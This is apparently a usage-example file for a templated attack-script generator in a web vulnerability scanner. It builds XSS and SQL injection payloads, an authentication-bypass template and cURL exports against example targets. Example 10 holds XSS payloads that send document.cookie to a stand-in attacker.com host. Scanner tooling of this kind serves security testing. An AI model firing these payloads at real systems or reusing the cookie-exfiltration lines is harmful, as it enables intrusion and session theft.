"""
模板化攻击脚本生成器使用示例
=============================

本文件演示如何使用模板化攻击脚本生成系统。

包含以下场景：
1. 基本使用 - 快速生成攻击脚本
2. 从YAML模板生成 - 加载插件模板生成脚本
3. 自定义策略 - 配置攻击策略
4. 批量生成 - 批量处理多个模板
5. 与扫描引擎集成 - 实际扫描场景

"""

import os
import sys

# 添加项目根目录到路径
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from scanner.engine.template_generator import (
    # 枚举类型
    AttackStrategy,
    PayloadCategory,
    EncodingMethod,
    VariableScope,
    
    # 数据实体
    Payload,
    AttackRequest,
    AttackScript,
    Template,
    TemplateVariable,
    
    # 核心组件
    VariableResolver,
    PayloadEncoder,
    PayloadMutator,
    PayloadGenerator,
    TemplateRenderer,
    AttackScriptBuilder,
    TemplateManager,
    BatchScriptGenerator,
    
    # 便捷函数
    create_script_builder,
    generate_attack_scripts,
    load_and_generate,
)


def example_1_basic_usage():
    """
    示例1: 基本使用
    
    使用便捷函数快速生成攻击脚本。
    """
    print("=" * 60)
    print("示例1: 基本使用 - 快速生成攻击脚本")
    print("=" * 60)
    
    # 定义插件配置（类似于YAML模板结构）
    plugin = {
        "id": "xss-reflected-basic",
        "info": {
            "name": "Reflected XSS Detection",
            "severity": "high",
            "description": "检测反射型XSS漏洞",
            "tags": ["xss", "injection"],
        },
        "requests": [
            {
                "method": "GET",
                "path": [
                    "{{BaseURL}}/?q={{payload}}",
                    "{{BaseURL}}/?search={{payload}}",
                    "{{BaseURL}}/?id={{payload}}",
                ],
                "payload_sets": {
                    "default": [
                        "<script>alert(1)</script>",
                        "<svg onload=alert(1)>",
                    ],
                    "aggressive": [
                        "<script>alert(1)</script>",
                        "<svg onload=alert(1)>",
                        "<img src=x onerror=alert(1)>",
                        "javascript:alert(1)",
                    ],
                },
                "matchers": [
                    {
                        "type": "word",
                        "words": ["<script>alert(1)</script>"],
                        "part": "body",
                    }
                ],
            }
        ],
    }
    
    # 目标URL
    target_url = "http://example.com"
    
    # 方式1: 使用便捷函数
    scripts = generate_attack_scripts(
        plugin=plugin,
        target_url=target_url,
        strategy="default",
        max_scripts=10,
    )
    
    print(f"\n生成了 {len(scripts)} 个攻击脚本:\n")
    
    for i, script in enumerate(scripts[:5], 1):  # 只显示前5个
        print(f"--- 脚本 {i} ---")
        print(f"  ID: {script.id}")
        print(f"  URL: {script.request.url}")
        print(f"  方法: {script.request.method}")
        print(f"  Payload原始: {script.payload.original}")
        print(f"  Payload编码: {script.payload.encoded[:50]}...")
        print(f"  漏洞类型: {script.vulnerability_type}")
        print(f"  严重程度: {script.severity}")
        print()
    
    return scripts


def example_2_builder_pattern():
    """
    示例2: 使用构建器模式
    
    使用AttackScriptBuilder进行更灵活的配置。
    """
    print("=" * 60)
    print("示例2: 使用构建器模式")
    print("=" * 60)
    
    # 创建构建器（链式调用）
    builder = (
        AttackScriptBuilder(strategy=AttackStrategy.AGGRESSIVE, max_payloads=20)
        .set_target("http://testphp.vulnweb.com")
        .set_context(
            csrf_token="test-csrf-token",
            session_id="test-session-id",
        )
    )
    
    # 定义SQL注入插件
    sqli_plugin = {
        "id": "sqli-basic",
        "info": {
            "name": "SQL Injection Detection",
            "severity": "critical",
            "tags": ["sqli", "injection", "database"],
        },
        "requests": [
            {
                "method": "GET",
                "path": [
                    "{{BaseURL}}/product.php?id={{payload}}",
                    "{{BaseURL}}/search.php?q={{payload}}",
                ],
                "payload_sets": {
                    "aggressive": [
                        "' OR '1'='1",
                        "1' AND '1'='1",
                        "' UNION SELECT NULL--",
                        "admin'--",
                    ],
                },
                "matchers": [
                    {
                        "type": "word",
                        "words": ["SQL syntax", "mysql_fetch", "ORA-"],
                        "part": "body",
                        "condition": "or",
                    }
                ],
            }
        ],
    }
    
    # 构建攻击脚本
    scripts = builder.build_from_plugin(sqli_plugin)
    
    print(f"\n生成了 {len(scripts)} 个SQL注入攻击脚本:\n")
    
    for i, script in enumerate(scripts[:3], 1):
        print(f"--- 脚本 {i} ---")
        print(f"  URL: {script.request.url}")
        print(f"  Payload: {script.payload.original}")
        print(f"  编码方式: {script.payload.encoding_method.value}")
        print(f"  变异类型: {script.payload.mutation_type}")
        print()
    
    # 获取统计信息
    stats = builder.get_statistics()
    print(f"构建统计: {stats}")
    
    return scripts


def example_3_payload_generation():
    """
    示例3: Payload生成与变异
    
    展示Payload生成器的各种功能。
    """
    print("=" * 60)
    print("示例3: Payload生成与变异")
    print("=" * 60)
    
    # 创建Payload生成器
    generator = PayloadGenerator(strategy=AttackStrategy.AGGRESSIVE)
    
    # 生成XSS Payload
    print("\n--- XSS Payload ---")
    xss_payloads = generator.generate(
        category=PayloadCategory.XSS,
        with_mutations=True,
    )
    
    print(f"生成 {len(xss_payloads)} 个XSS Payload变体:\n")
    for p in xss_payloads[:5]:
        print(f"  原始: {p.original[:40]}")
        print(f"  编码: {p.encoded[:40]}...")
        print(f"  风险等级: {p.risk_level}")
        print()
    
    # 生成SQL注入Payload
    print("\n--- SQL注入 Payload ---")
    sqli_payloads = generator.generate(
        category=PayloadCategory.SQLI,
        with_mutations=True,
    )
    
    print(f"生成 {len(sqli_payloads)} 个SQL注入 Payload变体:\n")
    for p in sqli_payloads[:5]:
        print(f"  原始: {p.original}")
        print(f"  编码: {p.encoded}")
        print()
    
    # 展示编码功能
    print("\n--- 编码演示 ---")
    test_payload = "<script>alert(1)</script>"
    
    print(f"原始Payload: {test_payload}\n")
    print(f"URL编码: {PayloadEncoder.url_encode(test_payload)}")
    print(f"Base64编码: {PayloadEncoder.base64_encode(test_payload)}")
    print(f"Unicode编码: {PayloadEncoder.unicode_encode(test_payload)[:50]}...")
    print(f"HTML实体编码: {PayloadEncoder.html_entity_encode(test_payload)}")
    
    # 链式编码
    chained = PayloadEncoder.chain_encode(
        test_payload,
        [EncodingMethod.URL, EncodingMethod.BASE64]
    )
    print(f"\n链式编码(URL->Base64): {chained[:50]}...")


def example_4_variable_resolver():
    """
    示例4: 变量解析器
    
    展示模板变量的解析功能。
    """
    print("=" * 60)
    print("示例4: 变量解析器")
    print("=" * 60)
    
    # 创建变量解析器
    resolver = VariableResolver()
    
    # 设置变量
    resolver.set_variable("BaseURL", "http://example.com", VariableScope.SESSION)
    resolver.set_variable("API_KEY", "test-api-key-12345", VariableScope.SESSION)
    resolver.set_variable("UserID", "user-001", VariableScope.REQUEST)
    
    # 解析模板字符串
    templates = [
        "{{BaseURL}}/api/users?id={{UserID}}",
        "{{BaseURL}}/search?q={{payload}}&token={{API_KEY}}",
        "Timestamp: {{Timestamp}}, Random: {{RandomInt}}, UUID: {{RandomUUID}}",
        "{{BaseURL}}/api?key={{API_KEY|md5}}",
    ]
    
    print("\n变量解析示例:\n")
    
    for template in templates:
        # 添加payload到上下文
        context = {"payload": "<script>alert(1)</script>"}
        resolved = resolver.resolve(template, context)
        print(f"模板: {template}")
        print(f"解析: {resolved}")
        print()
    
    # 显示所有可用变量
    print(f"可用变量: {resolver.get_available_variables()}")


def example_5_template_manager():
    """
    示例5: 模板管理器
    
    加载和管理YAML/JSON模板文件。
    """
    print("=" * 60)
    print("示例5: 模板管理器")
    print("=" * 60)
    
    # 创建模板管理器
    manager = TemplateManager(cache_enabled=True)
    
    # 获取插件目录
    plugin_dir = os.path.join(
        os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
        "plugins",
        "vulnerabilities"
    )
    
    if os.path.exists(plugin_dir):
        # 加载目录中的所有模板
        count = manager.load_directory(plugin_dir)
        print(f"\n加载了 {count} 个模板\n")
        
        # 获取所有模板
        templates = manager.get_all_templates()
        
        for template in templates:
            print(f"--- 模板: {template.id} ---")
            print(f"  名称: {template.get_info('name')}")
            print(f"  严重程度: {template.get_severity()}")
            print(f"  请求数量: {len(template.requests)}")
            print()
        
        # 按类别搜索
        print("--- 搜索 'xss' 类别 ---")
        xss_templates = manager.get_templates_by_category("xss")
        for t in xss_templates:
            print(f"  找到: {t.id}")
        
        # 按严重程度筛选
        print("\n--- 筛选 'high' 严重程度 ---")
        high_templates = manager.get_templates_by_severity("high")
        for t in high_templates:
            print(f"  找到: {t.id} ({t.get_severity()})")
    else:
        print(f"插件目录不存在: {plugin_dir}")
        print("请确保存在 scanner/plugins/vulnerabilities 目录")


def example_6_batch_generation():
    """
    示例6: 批量生成攻击脚本
    
    使用BatchScriptGenerator进行批量处理。
    """
    print("=" * 60)
    print("示例6: 批量生成攻击脚本")
    print("=" * 60)
    
    # 创建批量生成器
    batch = BatchScriptGenerator(
        strategy=AttackStrategy.DEFAULT,
        max_scripts_per_template=10,
    )
    
    # 设置目标
    batch.set_target("http://example.com")
    
    # 获取插件目录
    plugin_dir = os.path.join(
        os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
        "plugins",
        "vulnerabilities"
    )
    
    if os.path.exists(plugin_dir):
        # 加载模板
        count = batch.load_templates(plugin_dir)
        print(f"\n加载了 {count} 个模板\n")
        
        # 统计
        total_scripts = 0
        
        # 使用生成器遍历所有脚本
        print("生成的攻击脚本:\n")
        for script in batch.generate_all():
            total_scripts += 1
            print(f"  [{total_scripts}] {script.id}")
            print(f"      URL: {script.request.url}")
            print(f"      Payload: {script.payload.original[:40]}")
            
            if total_scripts >= 10:  # 限制输出
                print("  ... (更多脚本已省略)")
                break
        
        # 获取统计信息
        stats = batch.get_statistics()
        print(f"\n批量生成统计: {stats}")
    else:
        print(f"插件目录不存在: {plugin_dir}")


def example_7_single_request_builder():
    """
    示例7: 构建单个攻击请求
    
    快速构建单个攻击请求脚本。
    """
    print("=" * 60)
    print("示例7: 构建单个攻击请求")
    print("=" * 60)
    
    # 创建构建器
    builder = create_script_builder("aggressive")
    builder.set_target("http://example.com")
    
    # 快速构建单个请求
    script = builder.build_single_request(
        method="POST",
        url="http://example.com/api/login",
        payload="admin'--",
        headers={
            "Content-Type": "application/json",
            "X-Requested-With": "XMLHttpRequest",
        },
        body='{"username": "{{payload}}", "password": "test"}',
        matchers=[
            {
                "type": "word",
                "words": ["welcome", "dashboard"],
                "part": "body",
            }
        ],
    )
    
    print(f"\n构建的攻击脚本:\n")
    print(f"  ID: {script.id}")
    print(f"  URL: {script.request.url}")
    print(f"  方法: {script.request.method}")
    print(f"  Headers: {script.request.headers}")
    print(f"  Body: {script.request.body}")
    print(f"  Payload: {script.payload.original}")
    
    # 生成cURL命令
    print(f"\ncURL命令:\n{script.request.to_curl()}")


def example_8_curl_export():
    """
    示例8: 导出为cURL命令
    
    将攻击脚本转换为可执行的cURL命令。
    """
    print("=" * 60)
    print("示例8: 导出为cURL命令")
    print("=" * 60)
    
    # 定义一个复杂的攻击场景
    plugin = {
        "id": "post-auth-bypass",
        "info": {
            "name": "Authentication Bypass",
            "severity": "critical",
        },
        "requests": [
            {
                "method": "POST",
                "path": ["{{BaseURL}}/api/auth/login"],
                "headers": {
                    "Content-Type": "application/json",
                    "X-Forwarded-For": "127.0.0.1",
                },
                "body": '{"email": "admin@test.com", "password": "{{payload}}"}',
                "payload_sets": {
                    "default": [
                        "' OR '1'='1' --",
                        "admin'--",
                    ]
                },
            }
        ],
    }
    
    # 生成脚本
    scripts = generate_attack_scripts(
        plugin=plugin,
        target_url="http://target.example.com",
        strategy="default",
    )
    
    print(f"\n生成的cURL命令:\n")
    
    for i, script in enumerate(scripts, 1):
        print(f"--- 命令 {i} ---")
        print(script.request.to_curl())
        print()


def example_9_matcher_demo():
    """
    示例9: 匹配器配置演示
    
    展示各种匹配器的配置方式。
    """
    print("=" * 60)
    print("示例9: 匹配器配置演示")
    print("=" * 60)
    
    # 定义包含多种匹配器的插件
    plugin = {
        "id": "multi-matcher-demo",
        "info": {
            "name": "Multi-Matcher Detection",
            "severity": "high",
        },
        "requests": [
            {
                "method": "GET",
                "path": ["{{BaseURL}}/test?id={{payload}}"],
                "payload_sets": {
                    "default": ["test-payload"]
                },
                "matchers": [
                    # 关键词匹配
                    {
                        "type": "word",
                        "words": ["error", "exception", "failed"],
                        "part": "body",
                        "condition": "or",
                    },
                    # 状态码匹配
                    {
                        "type": "status",
                        "status": [200, 500],
                    },
                    # 正则匹配
                    {
                        "type": "regex",
                        "regex": [
                            r"SQL syntax.*?MySQL",
                            r"Warning.*?mysqli_",
                            r"ORA-\d{5}",
                        ],
                        "part": "body",
                    },
                    # 响应大小匹配
                    {
                        "type": "size",
                        "size": [1000, 2000],
                    },
                ],
            }
        ],
    }
    
    # 生成脚本
    builder = create_script_builder("default")
    builder.set_target("http://example.com")
    scripts = builder.build_from_plugin(plugin)
    
    print(f"\n生成的脚本匹配器配置:\n")
    
    for script in scripts:
        print(f"脚本ID: {script.id}")
        print(f"匹配器数量: {len(script.matchers)}")
        
        for i, matcher in enumerate(script.matchers, 1):
            print(f"\n  匹配器 {i}:")
            print(f"    类型: {matcher.get('type')}")
            
            if matcher.get('type') == 'word':
                print(f"    关键词: {matcher.get('words')}")
                print(f"    条件: {matcher.get('condition', 'or')}")
            elif matcher.get('type') == 'status':
                print(f"    状态码: {matcher.get('status')}")
            elif matcher.get('type') == 'regex':
                print(f"    正则: {matcher.get('regex')}")
            elif matcher.get('type') == 'size':
                print(f"    大小: {matcher.get('size')}")


def example_10_custom_payloads():
    """
    示例10: 自定义Payload库
    
    添加和使用自定义Payload。
    """
    print("=" * 60)
    print("示例10: 自定义Payload库")
    print("=" * 60)
    
    # 创建Payload生成器
    generator = PayloadGenerator(strategy=AttackStrategy.DEFAULT)
    
    # 添加自定义Payload
    custom_xss_payloads = [
        "<img src=x onerror=fetch('http://attacker.com/'+document.cookie)>",
        "<svg/onload=fetch('http://attacker.com/'+document.cookie)>",
        "<body onpageshow=alert(1)>",
    ]
    
    generator.add_custom_payloads(PayloadCategory.XSS, custom_xss_payloads)
    
    print("添加了自定义XSS Payload:\n")
    for p in custom_xss_payloads:
        print(f"  - {p[:60]}...")
    
    # 生成使用自定义Payload的脚本
    payloads = generator.generate(
        category=PayloadCategory.XSS,
        with_mutations=False,
    )
    
    print(f"\n生成的Payload（包含自定义）:\n")
    for p in payloads[:5]:
        source = "自定义" if p.source == "custom" else "内置"
        print(f"  [{source}] {p.original[:50]}...")


def main():
    """运行所有示例"""
    print("\n" + "=" * 60)
    print(" 模板化攻击脚本生成器 - 使用示例")
    print("=" * 60 + "\n")
    
    examples = [
        ("基本使用", example_1_basic_usage),
        ("构建器模式", example_2_builder_pattern),
        ("Payload生成与变异", example_3_payload_generation),
        ("变量解析器", example_4_variable_resolver),
        ("模板管理器", example_5_template_manager),
        ("批量生成", example_6_batch_generation),
        ("单个请求构建", example_7_single_request_builder),
        ("cURL导出", example_8_curl_export),
        ("匹配器配置", example_9_matcher_demo),
        ("自定义Payload", example_10_custom_payloads),
    ]
    
    print("可用示例:\n")
    for i, (name, _) in enumerate(examples, 1):
        print(f"  {i}. {name}")
    
    print("\n运行所有示例...\n")
    
    for name, func in examples:
        try:
            func()
            print("\n")
        except Exception as e:
            print(f"示例 '{name}' 执行出错: {e}\n")
    
    print("=" * 60)
    print(" 所有示例执行完成")
    print("=" * 60)


if __name__ == "__main__":
    main()